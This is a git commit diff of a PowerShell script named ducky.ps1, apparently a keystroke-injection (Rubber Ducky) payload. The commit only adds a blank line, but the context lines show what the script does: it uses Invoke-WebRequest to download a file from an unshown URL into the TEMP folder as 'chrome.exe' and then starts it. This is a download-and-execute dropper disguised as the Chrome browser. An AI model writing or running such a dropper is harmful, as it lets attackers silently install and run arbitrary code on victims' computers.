de3f2cce2e52ceb8d3e2afc38385b6f975b34a2b
Riley <60358181+h9839@users.noreply.github.com>
2023-08-06 15:28:50 -0600

    Add files via upload

--- ducky.ps1
+++ ducky.ps1
@@ -3,3 +3,4 @@ $outpath = "$env:TEMP/chrome.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
 $chromeExecutablePath = Join-Path $env:TEMP "chrome.exe"
 Start-Process -FilePath $chromeExecutablePath
+ 
